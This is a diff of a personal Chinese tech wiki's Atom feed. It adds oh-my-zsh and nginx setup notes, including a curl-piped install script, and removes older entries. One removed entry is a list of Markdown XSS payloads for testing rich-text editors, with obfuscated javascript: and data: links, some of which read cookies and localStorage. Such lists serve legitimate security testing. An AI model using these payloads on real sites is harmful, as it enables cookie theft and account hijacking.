@@ -4,13 +4,85 @@
   <title><![CDATA[lonelyorWiki]]></title>
   <link href="http://www.lonelyor.org/lonelyorWiki/atom.xml" rel="self"/>
   <link href="http://www.lonelyor.org/lonelyorWiki/"/>
-  <updated>2019-07-29T09:27:14+08:00</updated>
+  <updated>2019-07-29T09:29:02+08:00</updated>
   <id>http://www.lonelyor.org/lonelyorWiki/</id>
   <author>
     <name><![CDATA[]]></name>
     
   </author>
   <generator uri="http://www.mweb.im/">MWeb</generator>
+  
+  <entry>
+    <title type="html"><![CDATA[oh-my-zsh配置]]></title>
+    <link href="http://www.lonelyor.org/lonelyorWiki/15643953233297.html"/>
+    <updated>2019-07-29T18:15:23+08:00</updated>
+    <id>http://www.lonelyor.org/lonelyorWiki/15643953233297.html</id>
+    <content type="html"><![CDATA[
+<h2 id="toc_0">下载安装</h2>
+
+<p>sh -c &quot;$(curl -fsSL <a href="https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)">https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</a>&quot;</p>
+
+<h2 id="toc_1">修改主题</h2>
+
+<p>nano ~/.zshrc 或者 nano /home/lonelyor/.zshrc<br/>
+ZSH_THEME=&quot;angoster&quot;</p>
+
+<p>使用命令<br/>
+ls ~/.oh-my-zsh/themes  查看可使用的主题列表</p>
+
+<h2 id="toc_2">更换默认shell</h2>
+
+<p>chsh -s /usr/bin/zsh<br/>
+重启即可看到效果</p>
+
+<h2 id="toc_3">安装插件</h2>
+
+<p>增加插件直接写名字就行，用空格隔开。<br/>
+plugins=(git autojump)</p>
+
+<p>安装 autojump<br/>
+sudo pacman -S autojump<br/>
+把以下代码添加到.zshrc<br/>
+<code>[[ -s ~/.autojump/etc/profile.d/autojump.sh ]] &amp;&amp; . ~/.autojump/etc/profile.d/autojump.sh</code></p>
+
+<p>安装zsh-syntax-highlighting命令高亮插件</p>
+
+<p>plugins=(git autojump zsh-syntax-highlighting)</p>
+
+<p>安装自动补全zsh-autosuggestions</p>
+
+<p>git clone git://github.com/zsh-users/zsh-autosuggestions $ZSH_CUSTOM/plugins/zsh-autosuggestions</p>
+
+<p>一键解压<br/>
+extract 自带的</p>
+
+<p>最后使用 source .zshrc 命令让配置生效。</p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[arch 使用 nginx -t 时报错“could not build optimal types_hash, you should increase either types_hash_max_size: 1024 or types_hash_bucket_size: 64; ignoring types_hash_bucket_size” 解决办法]]></title>
+    <link href="http://www.lonelyor.org/lonelyorWiki/15643901825363.html"/>
+    <updated>2019-07-29T16:49:42+08:00</updated>
+    <id>http://www.lonelyor.org/lonelyorWiki/15643901825363.html</id>
+    <content type="html"><![CDATA[
+<p>根据官网说明解决。<br/>
+<a href="https://wiki.archlinux.org/index.php/Nginx">https://wiki.archlinux.org/index.php/Nginx</a></p>
+
+<p>添加配置 /etc/nginx/nginx.conf</p>
+
+<pre class="line-numbers"><code class="language-nginx">http {
+    types_hash_max_size 4096;
+    server_names_hash_bucket_size 128;
+    ...
+}
+</code></pre>
+
+<p><figure><img src="media/15643901825363/15643902439005.jpg" alt="" style="width:1070px;"/></figure></p>
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[manjaro 安装 vmtools]]></title>
@@ -767,75 +839,6 @@ Transmitting file data .done
 Committing transaction...
 Committed revision 1135.
 </code></pre>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Markdown XSS Payloads]]></title>
-    <link href="http://www.lonelyor.org/lonelyorWiki/15586769387988.html"/>
-    <updated>2019-05-24T13:48:58+08:00</updated>
-    <id>http://www.lonelyor.org/lonelyorWiki/15586769387988.html</id>
-    <content type="html"><![CDATA[
-<blockquote>
-<p>在测试某网站富文本编辑器时发现其使用了 markdown，md 会把文本转换成 html，那么肯定存在 xss 的问题，那么如何进行测试呢？于是我搜索了一番，发现前人已经有很好的研究成果了，但是鉴于安全问题的敏感，这里我就不贴原文出处了，不过感谢原作者JakobRPennington的贡献。</p>
-</blockquote>
-
-<p>Links</p>
-
-<pre class="line-numbers"><code class="language-md">[Basic](javascript:alert(&#39;Basic&#39;))
-[Local Storage](javascript:alert(JSON.stringify(localStorage)))
-[CaseInsensitive](JaVaScRiPt:alert(&#39;CaseInsensitive&#39;))
-[URL](javascript://www.google.com%0Aalert(&#39;URL&#39;))
-[In Quotes](&#39;javascript:alert(&quot;InQuotes&quot;)&#39;)
-</code></pre>
-
-<p>Images</p>
-
-<pre class="line-numbers"><code class="language-md">![Escape SRC - onload](https://www.example.com/image.png&quot;onload=&quot;alert(&#39;ImageOnLoad&#39;))
-![Escape SRC - onerror](&quot;onerror=&quot;alert(&#39;ImageOnError&#39;))
-</code></pre>
-
-<p>Fuzzing</p>
-
-<pre class="line-numbers"><code class="language-md">[XSS](javascript:prompt(document.cookie))
-[XSS](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
-[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
-[XSS](&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29)
-[XSS]: (javascript:prompt(document.cookie))
-[XSS](javascript:window.onerror=alert;throw%20document.cookie)
-[XSS](javascript://%0d%0aprompt(1))
-[XSS](javascript://%0d%0aprompt(1);com)
-[XSS](javascript:window.onerror=alert;throw%20document.cookie)
-[XSS](javascript://%0d%0awindow.onerror=alert;throw%20document.cookie)
-[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
-[XSS](vbscript:alert(document.domain))
-[XSS](javascript:this;alert(1))
-[XSS](javascript:this;alert(1&amp;#41;)
-[XSS](javascript&amp;#58this;alert(1&amp;#41;)
-[XSS](Javas&amp;#99;ript:alert(1&amp;#41;)
-[XSS](Javas%26%2399;ript:alert(1&amp;#41;)
-[XSS](javascript:alert&amp;#65534;(1&amp;#41;)
-[XSS](javascript:confirm(1)
-[XSS](javascript://www.google.com%0Aprompt(1))
-[XSS](javascript://%0d%0aconfirm(1);com)
-[XSS](javascript:window.onerror=confirm;throw%201)
-[XSS](�javascript:alert(document.domain&amp;#41;)
-![XSS](javascript:prompt(document.cookie))\
-![XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\
-![XSS&#39;&quot;`onerror=prompt(document.cookie)](x)\
-</code></pre>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[使用GET方法传输用户账号密码的危害]]></title>
-    <link href="http://www.lonelyor.org/lonelyorWiki/15586660103989.html"/>
-    <updated>2019-05-24T10:46:50+08:00</updated>
-    <id>http://www.lonelyor.org/lonelyorWiki/15586660103989.html</id>
-    <content type="html"><![CDATA[
-<p>通过 Get 方式提交数据时，用户名和密码将出现在 URL 上，如果页面可以被缓存（浏览器缓存、cdn 缓存、服务器缓存、中间件日志缓存等）或者其他人可以访问客户这台机器，就可以从历史记录获得该用户的帐号和密码，所以表单提交建议使用 Post 方法。</p>
 
 ]]></content>
   </entry>
